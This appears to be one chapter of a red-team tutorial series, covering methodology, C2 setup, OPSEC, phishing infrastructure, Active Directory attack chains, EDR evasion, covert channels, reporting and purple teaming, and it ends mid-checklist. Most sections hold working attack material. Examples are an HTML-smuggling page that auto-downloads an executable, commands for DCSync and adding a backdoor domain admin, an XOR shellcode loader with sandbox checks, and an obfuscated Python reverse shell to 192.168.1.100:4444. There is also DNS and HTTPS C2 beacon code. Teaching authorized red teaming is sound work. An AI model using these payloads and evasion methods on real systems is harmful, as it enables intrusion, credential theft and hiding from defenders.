# Part 34: Red Team Operations (Steps 331-340)

## Step 331: Red Team Methodology & Planning

```python
#!/usr/bin/env python3
# red_team_methodology.py

RED_TEAM_OVERVIEW = """
=== Red Team vs Penetration Test ===

Penetration Test:
  - Scope: Specific systems/applications
  - Time: Days to weeks
  - Objective: Find vulnerabilities
  - Noise: May be noisy
  - Reporting: List of vulns

Red Team Exercise:
  - Scope: Whole organization
  - Time: Weeks to months
  - Objective: Achieve business objective (data exfil, persistence)
  - Noise: Stealth is priority
  - Reporting: Attack narrative + Blue Team detection gaps

=== Red Team Phases ===

1. PLANNING
   - Define objectives (Crown Jewels)
   - Rules of Engagement
   - Deconfliction procedures
   - Attack paths hypothesis

2. RECONNAISSANCE
   - OSINT gathering
   - Technical recon
   - Physical recon

3. INITIAL ACCESS
   - Phishing
   - Exploit public-facing apps
   - Supply chain compromise
   - Physical access

4. EXECUTION/PERSISTENCE
   - Establish foothold
   - Install backdoors
   - Maintain persistence

5. PRIVILEGE ESCALATION
   - Local privilege escalation
   - Domain privilege escalation

6. DEFENSE EVASION
   - Bypass AV/EDR
   - Clear logs
   - Use legitimate tools

7. CREDENTIAL ACCESS
   - Dump credentials
   - Password spraying

8. LATERAL MOVEMENT
   - Pivot through network
   - Access additional systems

9. COLLECTION & EXFILTRATION
   - Find Crown Jewels
   - Exfiltrate data

10. REPORTING
    - Technical findings
    - Business impact
    - Detection gaps
    - MITRE ATT&CK mapping
"""

MITRE_ATTACK_MAP = {
    "Initial Access": [
        "T1566 - Phishing",
        "T1190 - Exploit Public-Facing Application",
        "T1133 - External Remote Services",
        "T1195 - Supply Chain Compromise",
        "T1078 - Valid Accounts",
    ],
    "Execution": [
        "T1059 - Command and Scripting Interpreter",
        "T1106 - Native API",
        "T1053 - Scheduled Task/Job",
    ],
    "Persistence": [
        "T1547 - Boot or Logon Autostart",
        "T1053 - Scheduled Task",
        "T1505 - Server Software Component",
        "T1078 - Valid Accounts",
    ],
    "Privilege Escalation": [
        "T1548 - Abuse Elevation Control",
        "T1134 - Access Token Manipulation",
        "T1543 - Create or Modify System Process",
    ],
    "Defense Evasion": [
        "T1070 - Indicator Removal",
        "T1036 - Masquerading",
        "T1055 - Process Injection",
        "T1027 - Obfuscated Files or Information",
    ],
    "Credential Access": [
        "T1110 - Brute Force",
        "T1003 - OS Credential Dumping",
        "T1558 - Steal or Forge Kerberos Tickets",
    ],
    "Lateral Movement": [
        "T1021 - Remote Services",
        "T1550 - Use Alternate Authentication Material",
        "T1570 - Lateral Tool Transfer",
    ],
    "Collection": [
        "T1005 - Data from Local System",
        "T1039 - Data from Network Shared Drive",
        "T1114 - Email Collection",
    ],
    "Exfiltration": [
        "T1041 - Exfiltration Over C2 Channel",
        "T1048 - Exfiltration Over Alternative Protocol",
        "T1567 - Exfiltration Over Web Service",
    ]
}

print(RED_TEAM_OVERVIEW)
print("\n=== MITRE ATT&CK Techniques ===")
for tactic, techniques in MITRE_ATTACK_MAP.items():
    print(f"\n{tactic}:")
    for t in techniques:
        print(f"  {t}")
```

## Step 332: C2 Framework Setup

```python
#!/usr/bin/env python3
# c2_frameworks_guide.py

C2_FRAMEWORKS = """
=== C2 (Command & Control) Frameworks ===

1. COBALT STRIKE
   - Commercial ($3,500/year)
   - Industry standard for red teams
   - Features: Beacon, Malleable C2, Team server
   - OPSEC: Excellent
   - Detections: Well-known signatures

2. METASPLOIT
   - Free/Open Source
   - Best for exploit delivery
   - Meterpreter payload
   - Easy to detect by AV/EDR

3. SLIVER
   - Free/Open Source (BishopFox)
   - Multi-operator
   - mTLS, WireGuard, HTTP, DNS C2
   - Similar to Cobalt Strike

4. HAVOC
   - Free/Open Source
   - Modern C2 framework
   - Demon agent
   - Good OPSEC features

5. BRUTE RATEL
   - Commercial
   - Evades many EDRs
   - Badger agent

6. EMPIRE/STARKILLER
   - Free/Open Source
   - PowerShell-focused
   - Starkiller: GUI frontend

7. COVENANT
   - Free/Open Source .NET
   - Grunt agent
   - GUI via web browser
"""

SLIVER_SETUP = """
=== Sliver C2 Setup ===

# Install Sliver (server)
curl https://sliver.sh/install | sudo bash
# Or:
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Start server
sliver-server

# In sliver console:
# Start listeners
mtls  --lhost 0.0.0.0 --lport 8888  # mTLS listener
https --lhost 0.0.0.0 --lport 443  # HTTPS listener

# Generate implants
generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe -G
generate --https 192.168.1.100 --os windows --arch amd64 --format shellcode -G

# Generate for Linux
generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf -G

# List implants
implants

# Interact with session
sessions
use <session_id>

# Commands in session:
info
whoami
pwd
ls
download /etc/shadow
upload ./payload /tmp/payload
shell  # Interactive shell
execute -o whoami  # Execute with output

# Lateral movement
psexec --hostname <target> --domain <domain> --username <user>
"""

HAVOC_SETUP = """
=== Havoc C2 Setup ===

# Install
git clone https://github.com/HavocFramework/Havoc
cd Havoc && make

# Server config (profiles/havoc.yaotl):
TeamServer {
    Host = "0.0.0.0"
    Port = 40056
    Build { 
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
    }
}

Listeners {
    Http {
        Name = "http-listener"
        Hosts = ["192.168.1.100"]
        Port = 80
        Uris = ["/cdn/", "/api/", "/static/"]
    }
}

# Start server
./havoc server --profile ./profiles/havoc.yaotl -v

# Client
./havoc client
# Connect to teamserver, create demon agent, deploy
"""

print(C2_FRAMEWORKS)
print(SLIVER_SETUP)
print(HAVOC_SETUP)
```

## Step 333: OPSEC & Operational Security

```python
#!/usr/bin/env python3
# opsec_guide.py

OPSEC_PRINCIPLES = """
=== OPSEC in Red Team Operations ===

1. ATTRIBUTION AVOIDANCE
   - Use disposable infrastructure
   - Rotate infrastructure between phases
   - Domain fronting for C2 traffic
   - Look like legitimate traffic

2. NETWORK CONSIDERATIONS
   - Use residential/cloud proxies
   - Avoid scanning from C2 server
   - Separate attack infra from C2
   - Use redirectors (separate hop between victim and C2)

3. PAYLOAD OPSEC
   - Never reuse payloads
   - Generate unique payloads per target
   - Customize signatures
   - Test against EDR before deployment

4. TIMING CONSIDERATIONS
   - Operate during business hours (looks normal)
   - Avoid holidays/weekends (less monitoring)
   - Mimic user behavior patterns
   - Use realistic sleep/jitter

5. LOG MANAGEMENT
   - Know what you're logging
   - Clear command history
   - Use timestomping
   - Be aware of network logs (NetFlow)

6. COMMAND & CONTROL
   - HTTPS on port 443 (blends in)
   - Use CDN for domain fronting
   - DNS C2 for egress filtering bypass
   - Slow beacon intervals (30-60 min)
   - Jitter (random delay +-20%)
"""

REDIRECTOR_SETUP = """
=== Redirector Setup (iptables) ===

# On redirector server:
# Forward all traffic from victim to real C2

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTPS traffic to C2
iptables -I INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REAL_C2_IP:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination REAL_C2_IP:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Nginx redirector (more control)
server {
    listen 443 ssl;
    ssl_certificate /etc/ssl/certs/cert.pem;
    ssl_certificate_key /etc/ssl/private/key.pem;
    
    # Only forward specific URIs
    location /api/update {
        proxy_pass https://REAL_C2_IP/api/update;
        proxy_set_header Host $host;
    }
    
    # Block everything else
    location / {
        return 403;
    }
}
"""

DOMAIN_FRONTING = """
=== Domain Fronting ===

Concept:
  - Use CDN (CloudFront, Azure, Fastly)
  - Victim connects to CDN IP
  - Host header points to C2 domain
  - CDN forwards to real C2
  - Traffic looks like CDN traffic

Cobalt Strike setup:
  - Deploy listener behind CDN
  - Set frontable CDN domain as proxy
  - Malleable C2 profile: set headers correctly

Malleable C2 Example:
http-get {
    set uri "/analytics/track";
    client {
        header "Host" "legitimate-site.cdn.example.com";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0)";
    }
}
"""

print(OPSEC_PRINCIPLES)
print(REDIRECTOR_SETUP)
print(DOMAIN_FRONTING)
```

## Step 334: Phishing Campaign Infrastructure

```python
#!/usr/bin/env python3
# phishing_infrastructure.py

PHISHING_INFRA = """
=== Red Team Phishing Infrastructure ===

1. DOMAIN SETUP
   - Register look-alike domains
   - Examples: corp-email.com, corp-helpdesk.net
   - Age the domain (buy old domains)
   - Add SPF, DKIM, DMARC records
   - MX records pointing to VPS

2. EMAIL INFRASTRUCTURE
   - Use VPS with dedicated IP
   - Configure PTR record (reverse DNS)
   - Postfix/Exim for SMTP
   - Check IP reputation before sending
   - Warm up IP gradually

3. LANDING PAGE
   - Clone legitimate login pages
   - Use HTTPS (Let's Encrypt)
   - Capture credentials
   - Redirect to real site after capture
   - Track click-through rates

4. PAYLOAD DELIVERY
   - Macro-enabled documents
   - ISO/LNK files (bypasses Mark of the Web)
   - HTML smuggling
   - Signed executables
"""

EMAIL_SERVER_SETUP = """
=== Postfix Email Server Setup ===

# Install
apt install postfix swaks

# /etc/postfix/main.cf key settings:
myhostname = mail.phishing-domain.com
mydomain = phishing-domain.com
myorigin = $mydomain
smtpd_tls_cert_file = /etc/ssl/certs/mail.pem
smtpd_tls_key_file = /etc/ssl/private/mail.key

# DNS Records needed:
# A record: mail.phishing-domain.com -> VPS_IP
# MX record: @ -> mail.phishing-domain.com
# SPF: v=spf1 mx ~all
# DKIM: (generate with opendkim)
# DMARC: v=DMARC1; p=none; rua=mailto:reports@phishing-domain.com

# Setup DKIM
apt install opendkim
opendkim-genkey -t -s mail -d phishing-domain.com
cat /etc/opendkim/keys/phishing-domain.com/mail.txt
# Add TXT record: mail._domainkey.phishing-domain.com

# Test sending
swaks --to victim@target.com \
    --from ceo@phishing-domain.com \
    --server localhost \
    --auth-user admin \
    --auth-password pass \
    --attach payload.docx \
    --body 'Please review the attached'
"""

HTML_SMUGGLING = """
=== HTML Smuggling ===
# Deliver payload through HTML file (bypasses email filters)
# Browser assembles the file, not the mail gateway

<!DOCTYPE html>
<html>
<head><title>Invoice</title></head>
<body>
<p>Please review the attached document.</p>
<script>
// Payload encoded as base64 in HTML
const fileData = 'TVqQ...';  // base64 payload
const byteCharacters = atob(fileData);
const byteNumbers = Array.from(byteCharacters, c => c.charCodeAt(0));
const byteArray = new Uint8Array(byteNumbers);
const blob = new Blob([byteArray], {type: 'application/octet-stream'});

// Auto-download
const a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = 'Invoice_Q4_2024.exe';
a.click();
</script>
</body>
</html>
"""

print(PHISHING_INFRA)
print(EMAIL_SERVER_SETUP)
print(HTML_SMUGGLING)
```

## Step 335: Active Directory Attack Chains

```python
#!/usr/bin/env python3
# ad_attack_chains.py

AD_ATTACK_CHAINS = """
=== AD Attack Chains: From Phish to DA ===

Chain 1: Phishing -> DA
  1. Phishing email -> Meterpreter on workstation
  2. Local privesc (AlwaysInstallElevated / SUID)
  3. Dump local creds (mimikatz)
  4. Password spray internal users
  5. Find Kerberoastable service account
  6. Crack TGS -> service account password
  7. Service account has admin on servers
  8. DCSync -> domain hashes
  9. Golden ticket -> persistence

Chain 2: Weak Password -> DA
  1. External password spray on O365
  2. Valid user credentials
  3. VPN/Citrix with same credentials
  4. Internal network access
  5. LLMNR/NBNS poisoning -> NTLM hash
  6. Crack hash / relay
  7. Local admin -> PtH laterally
  8. Find machine with DA logged in
  9. Mimikatz -> DA credentials
  10. Dcsync

Chain 3: External Vuln -> DA
  1. Web app RCE on DMZ server
  2. System user on web server
  3. Enumerate internal network
  4. AS-REP roasting (no preauth)
  5. Crack hash -> user credentials
  6. BloodHound -> attack path to DA
  7. Kerberoast high-value account
  8. Crack hash -> admin account
  9. DCSync
"""

BLOODHOUND_QUERIES = """
=== BloodHound Custom Cypher Queries ===

// Find shortest path to DA from any user
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p

// All users with unconstrained delegation
MATCH (c {unconstraineddelegation: true}) RETURN c.name

// Computers where DA has sessions
MATCH (c:Computer)-[:HasSession]->(u:User {admincount: true})
RETURN c.name, u.name

// Kerberoastable users with high-privilege rights
MATCH (u:User {hasspn: true})
WHERE u.admincount = true OR u.highvalue = true
RETURN u.name, u.description

// Find LAPS deployment
MATCH (c:Computer) WHERE c.haslaps = true RETURN c.name LIMIT 10
MATCH (c:Computer) WHERE c.haslaps = false RETURN c.name LIMIT 10

// Find users who can read LAPS passwords
MATCH p=(u)-[r:ReadLAPSPassword]->(c:Computer) RETURN p

// Owned groups of owned users
MATCH p=(u:User {owned: true})-[r:MemberOf|AdminTo|HasSession*1..5]->(t)
WHERE NOT t = u RETURN p

// Path from owned to DA with bloodhound
MATCH p=shortestPath((u:User {owned: true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))
RETURN p
"""

POST_DA_ACTIONS = """
=== Post-Domain Admin Actions ===

1. DCSYNC - Dump all domain hashes
   secretsdump.py -just-dc domain.local/admin@dc01
   lsadump::dcsync /all /csv  (mimikatz)

2. NTDS.dit Extraction
   # Via VSS
   vssadmin create shadow /for=C:
   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .
   # Via NTDSutil
   ntdsutil "activate instance ntds" "ifm" "create full C:\\temp\\ntds" "quit" "quit"

3. Golden Ticket
   # Get KRBTGT hash from DCSync
   # Create golden ticket
   mimikatz# kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /endin:600

4. Create Admin Account
   net user backdoor Password123! /add /domain
   net group 'Domain Admins' backdoor /add /domain

5. WMI Persistence
   Set-WmiInstance ... (fileless persistence as DA)
"""

print(AD_ATTACK_CHAINS)
print(BLOODHOUND_QUERIES)
print(POST_DA_ACTIONS)
```

## Step 336: EDR/AV Evasion Techniques

```python
#!/usr/bin/env python3
# edr_av_evasion.py

EVASION_TECHNIQUES = """
=== EDR/AV Evasion Techniques ===

1. SIGNATURE EVASION
   - XOR/encrypt payload
   - Custom packers
   - In-memory execution (never touch disk)
   - Reflective DLL loading
   - Shellcode loaders

2. BEHAVIOR EVASION
   - Avoid suspicious API calls (VirtualAllocEx, CreateRemoteThread)
   - Use indirect syscalls
   - NTDLL unhooking
   - Early Bird APC injection
   - Process doppelganging

3. AMSI BYPASS
   - Patch AmsiOpenSession
   - Memory patching
   - AMSI DLL tampering

4. ETW BYPASS
   - Patch EtwEventWrite
   - Disable ETW providers

5. ENVIRONMENTAL KEYING
   - Only run in specific environment
   - Check hostname/domain before running
   - Validate time/date

6. SLEEP OBFUSCATION
   - Encrypt shellcode while sleeping
   - Avoid in-memory scanning
   - Ekko, Foliage, Cronos sleep
"""

SHELLCODE_LOADER = '''
// Simple XOR shellcode loader (C)
#include <windows.h>
#include <stdio.h>

// XOR encrypted shellcode
unsigned char enc_shellcode[] = { 0xde, 0xad, 0xbe, 0xef ... };
unsigned char key[] = "K3y_V@lu3";

void decrypt_xor(unsigned char *data, int len, unsigned char *key, int key_len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Anti-sandbox: Sleep and check time
    DWORD start = GetTickCount();
    Sleep(3000);
    if (GetTickCount() - start < 2000) {
        return 0; // Sandbox accelerated time
    }
    
    // Decrypt shellcode
    int len = sizeof(enc_shellcode);
    decrypt_xor(enc_shellcode, len, key, sizeof(key)-1);
    
    // Allocate memory as RW first (not RWX - suspicious)
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, enc_shellcode, len);
    
    // Change to RX
    DWORD old_protect;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old_protect);
    
    // Execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    return 0;
}
'''

NTDLL_UNHOOKING = '''
#!/usr/bin/env python3
# NTDLL unhooking via Python (concept)
# EDRs hook NTDLL to monitor API calls
# We restore original NTDLL from disk

import ctypes
import struct

def unhook_ntdll():
    """Restore original NTDLL from disk"""
    # Read fresh copy from disk
    with open(r"C:\Windows\System32\ntdll.dll", "rb") as f:
        fresh_ntdll = f.read()
    
    # Get current NTDLL in memory
    ntdll_handle = ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll")
    
    # Parse PE headers to find .text section
    # ... (PE parsing code)
    
    # Restore .text section from fresh copy
    # VirtualProtect -> WriteProcessMemory -> VirtualProtect
    print("[*] NTDLL .text section restored")

# Concept - real implementation requires PE parsing
print(NTDLL_UNHOOKING_CONCEPT := "NTDLL unhooking restores original syscall stubs")
'''

PYTHON_AV_EVASION = '''
#!/usr/bin/env python3
# Python payload obfuscation

import base64
import zlib

# Original payload
original = b"""
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.100',4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
"""

# Layer 1: Compress
compressed = zlib.compress(original)

# Layer 2: Base64
encoded = base64.b64encode(compressed)

# Create loader
loader = f"""
import base64, zlib
exec(zlib.decompress(base64.b64decode({encoded!r})).decode())
"""

print("Obfuscated payload (Layer 1):")
print(loader[:100] + "...")

# Layer 3: Further obfuscation with string concatenation
obfuscated = loader.replace('exec', 'e'+'x'+'e'+'c')
obfuscated = obfuscated.replace('import', 'imp'+'ort')

print("\n[*] Test against AV with: antiscan.me (don't use VirusTotal for red team!!)")
'''

print(EVASION_TECHNIQUES)
print("\n=== Shellcode Loader Example ===")
print(SHELLCODE_LOADER)
print("\n=== NTDLL Unhooking ===")
print(NTDLL_UNHOOKING)
print("\n=== Python Evasion ===")
print(PYTHON_AV_EVASION)
```

## Step 337: Covert Channel Communication

```python
#!/usr/bin/env python3
# covert_channels.py

from typing import Optional
import socket
import base64

class CovertChannel:
    """Covert channels for C2 communication"""
    
    def dns_c2_channel(self, c2_domain: str):
        """ส่ง command/response ผ่าน DNS"""
        import dns.resolver
        import dns.message
        
        # Encode command in TXT record subdomain
        def send_data(data: str) -> str:
            encoded = base64.b32encode(data.encode()).decode().lower().rstrip('=')
            # Split into DNS label chunks (max 63 chars)
            chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
            fqdn = '.'.join(chunks) + '.' + c2_domain
            
            try:
                # Query TXT record to get response
                answers = dns.resolver.resolve(fqdn, 'TXT')
                response_b32 = str(answers[0]).strip('"')
                response = base64.b32decode(response_b32.upper() + '====').decode()
                return response
            except:
                return ''
        
        return send_data
    
    def https_c2_channel(self, c2_url: str):
        """HTTPS C2 ผ่าน legitimate-looking traffic"""
        import requests
        import json
        
        # Mimic browser traffic
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        
        def check_in(system_info: dict) -> Optional[str]:
            """Check in to C2 server"""
            # Data hidden in cookie
            cookie_data = base64.b64encode(json.dumps(system_info).encode()).decode()
            headers['Cookie'] = f'_ga=GA1.2.{cookie_data[:50]}'
            
            try:
                r = requests.get(c2_url, headers=headers, timeout=10)
                # Command hidden in response headers/body
                if 'X-Custom-Header' in r.headers:
                    return base64.b64decode(r.headers['X-Custom-Header']).decode()
                # Or in body comment: <!-- encoded_command -->
                import re
                match = re.search(r'<!--(.+?)-->', r.text)
                if match:
                    return base64.b64decode(match.group(1)).decode()
            except:
                pass
            return None
        
        return check_in
    
    def smb_named_pipe_c2(self, named_pipe: str = 'svcctl'):
        """Named pipe C2 (stealth - uses legitimate Windows mechanism)"""
        # Server (attacker) end
        server_code = f"""
import win32pipe
import win32file

pipe = win32pipe.CreateNamedPipe(
    r"\\\\.\\pipe\\{named_pipe}",
    win32pipe.PIPE_ACCESS_DUPLEX,
    win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_WAIT,
    1, 65536, 65536, 0, None
)

win32pipe.ConnectNamedPipe(pipe, None)
# Read/write commands
data, nread = win32file.ReadFile(pipe, 65536)
print(f"Received: {{data}}")
win32file.WriteFile(pipe, b'whoami output here')
"""
        
        # Client (victim) end
        client_code = f"""
import win32file
pipe = win32file.CreateFile(
    r"\\\\server\\pipe\\{named_pipe}",
    win32file.GENERIC_READ | win32file.GENERIC_WRITE,
    0, None, win32file.OPEN_EXISTING, 0, None
)
win32file.WriteFile(pipe, b'check-in')
"""
        return server_code, client_code

C2_TRAFFIC_ANALYSIS = """
=== C2 Traffic Evasion ===

1. BEACONING PATTERNS
   - Vary check-in intervals (avoid pattern detection)
   - Use jitter: sleep = base_interval + random(-jitter, +jitter)
   - Cobalt Strike: set sleeptime, set jitter
   - Sliver: --jitter, --reconnect-interval

2. USER AGENT ROTATION
   - List of real browser UAs
   - Match target organization's browser
   - Include Accept/Accept-Language headers

3. MALLEABLE C2 PROFILES (Cobalt Strike)
   - Customize HTTP headers/URIs
   - Mimic specific software (Dropbox, Slack, CDN)
   - https://github.com/rsmudge/Malleable-C2-Profiles

4. TRAFFIC BLENDING
   - Send legitimate requests mixed with C2
   - Use CDN for traffic distribution
   - Split C2 and data channels

5. ENCRYPTED CHANNELS
   - mTLS for authentication + encryption
   - Custom encryption on top of HTTPS
   - Prevent SSL inspection by using pinning
"""

print("=== Covert Channels ===")
print(C2_TRAFFIC_ANALYSIS)
```

## Step 338: Red Team Toolset

```bash
#!/bin/bash
# red_team_toolset.sh

echo "=== Red Team Essential Tools ==="

# ============================================
# Initial Access
# ============================================
echo "Initial Access Tools:"
echo "  GoPhish: Phishing campaigns"
echo "  Social-Engineer Toolkit (SET)"
echo "  Modlishka: Reverse proxy phishing"
echo "  Evilginx2: Man-in-the-middle phishing"
echo "  macro_pack: Generate Office macros"

# ============================================  
# C2 Frameworks
# ============================================
echo "\nC2 Frameworks:"
echo "  Metasploit: msfconsole"
echo "  Sliver: sliver-server"
echo "  Havoc: ./havoc server"
echo "  Empire/Starkiller: poetry run python empire"
echo "  Covenant: dotnet run"

# ============================================
# Post-Exploitation
# ============================================  
echo "\nPost-Exploitation:"
echo "  Mimikatz (Windows): credential dumping"
echo "  Impacket: Python scripts for Windows"
echo "  CrackMapExec: Network-wide testing"
echo "  BloodHound: AD attack paths"
echo "  PowerSploit: PowerShell post-exploitation"
echo "  PowerSharpPack: .NET tools in PowerShell"
echo "  BOF (Beacon Object Files): In-memory tools"

# ============================================
# Defense Evasion
# ============================================
echo "\nDefense Evasion:"
echo "  AMSI.fail: AMSI bypass generator"
echo "  Invoke-Obfuscation: PS obfuscation"
echo "  Veil-Framework: AV evasion"
echo "  SharpEvader: .NET AV evasion"
echo "  GadgetToJScript: .NET in JScript"

# ============================================
# Recon & OSINT
# ============================================
echo "\nRecon:"
echo "  Maltego: Link analysis"
echo "  SpiderFoot: OSINT automation"
echo "  Amass: Domain enumeration"
echo "  theHarvester: Email/domain OSINT"
echo "  Recon-ng: Web-based OSINT"

# ============================================
# Network
# ============================================
echo "\nNetwork:"
echo "  Chisel: Pivoting"
echo "  Ligolo-ng: Advanced pivoting"
echo "  Proxychains: Tool proxying"
echo "  sshuttle: VPN over SSH"
echo "  Responder: LLMNR/NBT-NS poisoner"
echo "  Impacket-ntlmrelayx: NTLM relay"

# ============================================
# Infrastructure
# ============================================
echo "\nInfrastructure:"
echo "  Terraform: Infrastructure as code"
echo "  Ansible: Configuration management"
echo "  Redirectors: nginx/Apache reverse proxy"
echo "  CloudFront: Domain fronting"

echo "\n[+] Red Team toolset overview complete"
```

## Step 339: Red Team Reporting

```python
#!/usr/bin/env python3
# red_team_report_generator.py

from datetime import datetime
from typing import List, Dict

class RedTeamReport:
    def __init__(self):
        self.engagement_name = ""
        self.client = ""
        self.start_date = ""
        self.end_date = ""
        self.objectives = []
        self.attack_narrative = []
        self.mitre_techniques = []
        self.detection_gaps = []
        self.recommendations = []
    
    def generate_executive_summary(self) -> str:
        objectives_met = [o for o in self.objectives if o.get('achieved')]
        
        return f"""## Executive Summary

**Engagement:** {self.engagement_name}
**Client:** {self.client}
**Duration:** {self.start_date} to {self.end_date}

### Overview
A red team exercise was conducted against {self.client} with the objective of 
simulating real-world adversary tactics to assess security posture and detection capabilities.

### Objectives Achievement
- Total Objectives: {len(self.objectives)}
- Achieved: {len(objectives_met)}
- Not Achieved: {len(self.objectives) - len(objectives_met)}

### Key Findings
1. Initial access obtained via {self.attack_narrative[0].get('method', 'phishing') if self.attack_narrative else 'phishing'}
2. Internal network fully compromised within {self._estimate_time()}
3. Crown jewels accessed: See objective details below
4. Blue team detection rate: {self._calculate_detection_rate()}%

### Business Impact
- Complete domain compromise achieved
- Sensitive data exfiltration demonstrated
- Critical infrastructure accessible
"""
    
    def _estimate_time(self) -> str:
        # Calculate time to objectives
        return "48 hours"
    
    def _calculate_detection_rate(self) -> int:
        detected = sum(1 for e in self.attack_narrative if e.get('detected'))
        total = len(self.attack_narrative)
        return int((detected / total * 100) if total > 0 else 0)
    
    def generate_attack_narrative(self, events: List[Dict]) -> str:
        narrative = "## Attack Narrative\n\n"
        narrative += "### Timeline\n\n"
        
        for event in events:
            narrative += f"""
**{event.get('timestamp', '')} - {event.get('phase', 'Unknown Phase')}**

{event.get('description', '')}

- **Technique:** {event.get('mitre_id', '')} - {event.get('mitre_name', '')}
- **Tools Used:** {event.get('tools', 'N/A')}
- **Detected:** {'Yes' if event.get('detected') else 'No'}
- **OPSEC Notes:** {event.get('opsec', 'N/A')}

---
"""
        return narrative
    
    def generate_mitre_mapping(self) -> str:
        mapping = "## MITRE ATT&CK Mapping\n\n"
        mapping += "| Tactic | Technique | ID | Detected |\n"
        mapping += "|--------|-----------|-----|---------|\n"
        
        for technique in self.mitre_techniques:
            mapping += f"| {technique.get('tactic')} | {technique.get('name')} | {technique.get('id')} | {'\u2714' if technique.get('detected') else '\u2718'} |\n"
        
        return mapping
    
    def generate_detection_gaps(self) -> str:
        gaps = "## Detection & Response Gaps\n\n"
        
        for i, gap in enumerate(self.detection_gaps, 1):
            gaps += f"""
### Gap {i}: {gap.get('title')}

**Severity:** {gap.get('severity')}
**Phase:** {gap.get('phase')}

**Description:** {gap.get('description')}

**Evidence:**
{gap.get('evidence', 'N/A')}

**Recommendation:**
{gap.get('recommendation')}

"""
        return gaps
    
    def generate_full_report(self) -> str:
        return "\n".join([
            f"# Red Team Assessment Report",
            f"## {self.client} | {self.engagement_name}",
            f"**Date:** {datetime.now().strftime('%Y-%m-%d')}\n",
            "---\n",
            self.generate_executive_summary(),
            self.generate_attack_narrative(self.attack_narrative),
            self.generate_mitre_mapping(),
            self.generate_detection_gaps(),
            "## Recommendations\n\n",
            *[f"- {r}" for r in self.recommendations]
        ])

# Demo
rep = RedTeamReport()
rep.client = "ACME Financial"
rep.engagement_name = "Red Team Exercise Q4 2024"
rep.start_date = "2024-10-01"
rep.end_date = "2024-10-31"
rep.objectives = [
    {'name': 'Domain Admin access', 'achieved': True},
    {'name': 'Access financial DB', 'achieved': True},
    {'name': 'Exfiltrate customer data', 'achieved': False},
]
rep.attack_narrative = [
    {'timestamp': 'Day 1 10:30', 'phase': 'Initial Access', 
     'description': 'Phishing email sent to finance department',
     'mitre_id': 'T1566.001', 'mitre_name': 'Spearphishing Attachment',
     'tools': 'GoPhish', 'detected': False},
    {'timestamp': 'Day 1 14:22', 'phase': 'Execution',
     'description': 'Macro-enabled document opened by employee',
     'mitre_id': 'T1059.001', 'mitre_name': 'PowerShell',
     'tools': 'Havoc Demon', 'detected': False},
]
rep.detection_gaps = [
    {'title': 'Phishing Detection', 'severity': 'CRITICAL',
     'phase': 'Initial Access',
     'description': 'Email gateway failed to detect macro-enabled attachment',
     'recommendation': 'Enable macro blocking for external emails'}
]
rep.recommendations = [
    'Deploy EDR on all endpoints',
    'Enable PowerShell constrained language mode',
    'Implement email sandboxing',
    'Enable MFA for all accounts'
]

print(rep.generate_full_report()[:2000])
print("... (report continues)")
```

## Step 340: Purple Team Exercises

```python
#!/usr/bin/env python3
# purple_team_exercises.py

PURPLE_TEAM_CONCEPT = """
=== Purple Team Concept ===

Purple Team = Red Team + Blue Team working together

Objectives:
  - Test specific detection capabilities
  - Validate security controls
  - Improve detection rules
  - Knowledge transfer

Process:
  1. Red team executes technique
  2. Blue team checks if detected
  3. If not detected: Blue team creates detection
  4. Red team validates detection
  5. Document and iterate

Key Frameworks:
  - MITRE ATT&CK: Standard technique library
  - TIBER-EU: European red team framework
  - CBEST: UK financial sector framework
  - iRED: Interactive red teaming framework

=== Atomic Red Team ===
# Atomic tests for specific MITRE techniques
# https://github.com/redcanaryco/atomic-red-team

# Install
git clone https://github.com/redcanaryco/atomic-red-team

# Run specific technique
# T1003.001 - LSASS Memory dump
Invoke-AtomicTest T1003.001

# T1059.001 - PowerShell execution
Invoke-AtomicTest T1059.001

# List all tests for a technique
Get-AtomicTest T1566.001
"""

DETECTION_VALIDATION = """
=== Detection Validation Checklist ===

For each MITRE technique:

1. SIEM/Log Collection
   [ ] Are relevant logs being collected?
   [ ] Are they stored long enough?
   [ ] Can we query them efficiently?

2. Detection Rules
   [ ] Do we have detection rules?
   [ ] Are they tuned (low false positives)?
   [ ] Do they fire on the test?

3. Alert Quality
   [ ] Enough context to investigate?
   [ ] Severity appropriate?
